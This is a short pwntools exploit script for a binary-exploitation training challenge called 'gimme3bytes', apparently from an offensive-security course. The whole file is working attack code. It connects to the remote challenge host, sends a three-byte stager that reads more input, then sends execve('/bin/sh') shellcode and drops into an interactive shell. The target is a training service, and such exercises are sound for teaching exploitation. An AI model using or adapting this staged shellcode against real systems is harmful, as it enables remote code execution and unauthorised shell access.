from pwn import*

#p = process("./gimme3bytes")
#gdb.attach(p,
#'''
#''')
p = remote("bin.training.offdef.it", 2004) 
#input("wait")


shellcode1 = b"\x5A\x0F\x05"
p.send(shellcode1)

#input("wait")

shellcode2 = b"\x90"*3 + b"\x48\x89\xF7\x48\x83\xC7\x19\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00"
p.send(shellcode2)

p.interactive()